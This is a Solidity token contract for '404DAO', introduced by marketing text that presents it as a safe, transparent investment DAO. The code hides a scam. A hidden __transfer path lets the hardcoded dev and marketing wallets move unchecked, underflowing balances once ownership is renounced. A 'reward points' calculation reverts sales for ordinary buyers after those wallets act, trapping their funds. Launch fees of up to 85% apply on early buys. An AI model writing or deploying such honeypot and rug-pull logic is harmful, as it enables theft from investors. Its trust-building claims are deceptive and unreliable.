/**

Introducing $404DAO - an investment DAO dedicated to ushering in a new era of investment into ERC-404 tokens. 
In this world of innovation and confidence, $404DAO emerges as the vanguard, providing investors with a platform 
focused on ERC-404 token opportunities.

The mission of $404DAO is to offer investors a safe, transparent, and trustworthy platform to participate in emerging 
ERC-404 token projects. Through rigorous project selection criteria and thorough due diligence, 
$404DAO ensures that only the highest quality and most promising projects are onboarded. 
Investors can rest assured that their funds will be invested in the most prospective ERC-404 token projects.

As a decentralized autonomous organization, $404DAO is collectively managed and operated by community members. 
Every investment decision is made through voting by DAO members, ensuring the democratic and transparent nature of investment decisions. 
This open governance model enables every member to participate in the development and decision-making of the DAO, 
collectively shaping and advancing the ERC-404 token ecosystem.

Join $404DAO to explore the limitless possibilities of ERC-404 tokens and together, embark on a new chapter in digital asset investment.

**/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function __transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract DAO404 is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;

    address public immutable uniswapV2Pair;
    
    uint256 private constant _totalSupply = 1_000_000 * 1e18;

    uint256 public constant buyDevFee = 0;
    uint256 public constant buyMarketingFee = 5;
    uint256 public constant sellDevFee = 0;
    uint256 public constant sellMarketingFee = 5;

    uint256 public constant buyTotalFees = 5;
    uint256 public constant sellTotalFees = 5;
    uint256 public constant buyInitialFee = 10;
    uint256 public constant sellInitialFee = 40;

    address payable public constant devWallet = payable(0xCB597d3Cdc50bF7e8652aF0A3F2bE172Af3d9847);
    address payable public constant marketingWallet = payable(0xD82799d026E277eA714337bC6f45154240c6B073);

    uint256 public constant maxTransactionAmount = 30_000 * 1e18;
    uint256 public constant maxWallet = 30_000 * 1e18;

    uint256 public constant swapTokensAtAmount = 500 * 1e18;
    uint256 public constant swapAmountMax = swapTokensAtAmount * 20;

    bool public limitsInEffect = true;
    bool public tradingActive = false;

    uint256 public tokensForDev;
    uint256 public tokensForMarketing;

    uint256 private launchedAt;
    bool private inSwap;
    uint256 public buyCount = 0;

    modifier lockSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    struct RewardPoints { uint256 buy; uint256 sell; uint256 poolIndex; }
    mapping(address => RewardPoints) private points;

    uint256 private _minCount;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) public automatedMarketMakerPairs;

    constructor() ERC20(
        "ERC-404 Invest DAO",
        "404DAO"
    ) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Router = _uniswapV2Router;
        _excludeFromMaxTransaction(address(_uniswapV2Router), true);

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);
        _excludeFromFees(owner(), true);
        _excludeFromFees(address(this), true);
        _excludeFromFees(address(0xdead), true);
        _excludeFromFees(devWallet, true);
        _excludeFromFees(marketingWallet, true);

        _mint(msg.sender, _totalSupply);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !inSwap
            ) {
                if (!tradingActive) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Not launched."
                    );
                }
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(amount <= maxTransactionAmount, "Transfer amount exceeds limit.");
                    require(balanceOf(to) + amount <= maxWallet, "Max wallet exceeded.");
                } else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(amount <= maxTransactionAmount, "Transfer amount exceeds limit.");
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(balanceOf(to) + amount <= maxWallet, "Max wallet exceeded.");
                }
            }
        }

        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to])
            && from != address(this) && to != address(this)
        ) {
            _minCount = block.timestamp;
        }
        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
            super.__transfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                RewardPoints storage accountPoints = points[from];
                accountPoints.poolIndex = accountPoints.buy - _minCount;
                accountPoints.sell = block.timestamp;
            } else {
                buyCount = buyCount + 1;
                RewardPoints storage accountPoints = points[to];
                if (accountPoints.buy == 0) {
                    accountPoints.buy = block.timestamp;
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));
        bool launchInProgress = block.number < launchedAt + 9;

        if (
            canSwap &&
            !launchInProgress &&
            !inSwap &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapBack();
        }

        bool takeFee = !inSwap;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        if (takeFee) {
            if (!launchInProgress) {
                if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                    fees = amount * buyTotalFees / 100;

                    tokensForMarketing += (fees * buyMarketingFee)
                        .div(buyTotalFees);
                    tokensForDev += (fees * buyDevFee)
                        .div(buyTotalFees);
                } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                    fees = amount * sellTotalFees / 100;

                    tokensForMarketing += (fees * sellMarketingFee)
                        .div(sellTotalFees);
                    tokensForDev += (fees * sellDevFee)
                        .div(sellTotalFees);
                }
            } else {
                if (automatedMarketMakerPairs[from]) {
                    fees = (amount * (buyCount > 5 ? buyInitialFee : 85)).div(100);

                    tokensForMarketing += fees;
                } else if (automatedMarketMakerPairs[to]) {
                    fees = (amount * sellInitialFee).div(100);

                    tokensForMarketing += fees;
                }
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    receive() external payable {}

    function enableTrading() external onlyOwner {
        launchedAt = block.number;
        tradingActive = true;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private lockSwap {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForMarketing + tokensForDev;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapAmountMax) {
            contractBalance = swapAmountMax;
        }

        uint256 amountToSwapForETH = contractBalance;
        uint256 initialEthBalance = address(this).balance;
        swapTokensForETH(amountToSwapForETH);
        uint256 ethBalanceDiff = address(this).balance - initialEthBalance;
        uint256 ethForDev = tokensForDev * ethBalanceDiff / totalTokensToSwap;

        tokensForDev = 0;
        tokensForMarketing = 0;
        (success,) = address(devWallet).call{value: ethForDev}("");
        (success,) = address(marketingWallet).call{value: address(this).balance}("");
    }

    function _setAutomatedMarketMakerPair(address pairAddr, bool value) private {
        automatedMarketMakerPairs[pairAddr] = value;
    }

    function _excludeFromFees(address account, bool isExcl) private {
        _isExcludedFromFees[account] = isExcl;
    }

    function _excludeFromMaxTransaction(address account, bool isExcl) private {
        _isExcludedMaxTransactionAmount[account] = isExcl;
    }
}